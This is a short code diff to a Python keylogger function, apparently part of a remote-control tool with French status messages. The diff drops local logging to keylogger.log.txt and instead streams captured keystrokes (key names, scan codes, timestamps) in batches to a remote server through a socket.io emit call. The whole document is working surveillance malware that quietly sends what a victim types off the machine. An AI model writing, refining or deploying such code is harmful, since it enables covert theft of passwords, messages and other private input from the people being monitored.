@@ -78,18 +78,10 @@ def record_and_send_keyboard_log(duration=10, sio=None):
             event_time = time.time()
             keyboard_log.append((event.scan_code, event.name, event.time))
 
-            file_path = 'keylogger.log.txt'
-            with open(file_path, 'w') as f:
-                for scan_code, name, event_time in keyboard_log:
-                    f.write(f"{event_time} - {name} - {scan_code}\n")
+            if sio and len(keyboard_log) > 10:
+                sio.emit('keyboard_response', {'keyboard_log': keyboard_log})
+                keyboard_log = []
 
-                    print("Keylogger enregistré dans keylogger.log.txt")
-
-                    if sio:
-                        with open(file_path, 'r') as f:
-                            log_content = f.read()
-                            sio.emit('keyboard_response', {'log': log_content})
-                            print("Keylogger envoyé à L'API")
+        print("Enregistrement du keylogger terminé")
     except Exception as e:
         print(f"Échec de l'enregistrement du keylogger: {e}")
-
